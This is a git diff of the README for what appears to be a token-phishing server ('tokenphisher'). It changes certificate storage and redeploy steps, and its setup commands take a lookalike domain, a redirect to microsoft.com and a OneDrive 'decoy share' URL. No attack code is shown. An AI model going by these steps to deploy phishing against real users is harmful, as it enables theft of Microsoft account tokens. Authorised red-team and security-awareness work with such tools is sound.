@@ -28,10 +28,21 @@ npm run setup -- \
 ```
 
 Setup will:
-1. Create a Cloudflare Origin certificate (valid ~15 years)
-2. Save certs to `./certs/`
-3. Write `config.json`
+1. Create a Cloudflare Origin certificate (valid ~15 years), or reuse an existing one
+2. Save certs to `/var/lib/tokenphisher/certs/<domain>/` (outside the app directory)
+3. Write `config.json` with absolute cert paths
 4. Update the `defaultConfig` block in `server.js`
+
+**Redeploying** — clone fresh, run setup again with the same `--domain`. Existing certs are reused automatically; no API token needed unless you pass `--force-renew`:
+
+```bash
+git pull   # or fresh clone into a new directory
+npm install
+npm run setup -- \
+  --domain share.example.com \
+  --redirect-url https://www.microsoft.com \
+  --already-logged-in-url https://onedrive.live.com/your-decoy-share
+```
 
 Set Cloudflare SSL/TLS mode to **Full (strict)**, then start the server:
 
@@ -103,6 +114,16 @@ npm run setup -- --config-only --from-config config.json
 ### Cloudflare (recommended)
 
 Use `npm run setup` with `--domain` and `--cf-token`. Origin certificates work when traffic is proxied through Cloudflare.
+
+Certs are stored persistently at **`/var/lib/tokenphisher/certs/<domain>/`** by default (survives redeploys). Override with `--cert-store` or `TOKENPHISHER_CERT_STORE`. Setup reuses valid certs automatically; use `--force-renew` only when you intentionally need a new certificate.
+
+```
+/var/lib/tokenphisher/certs/share.example.com/
+  privkey.pem
+  cert.pem
+  origin-ca.pem
+  cert-meta.json
+```
 
 ### Let's Encrypt (manual)
 
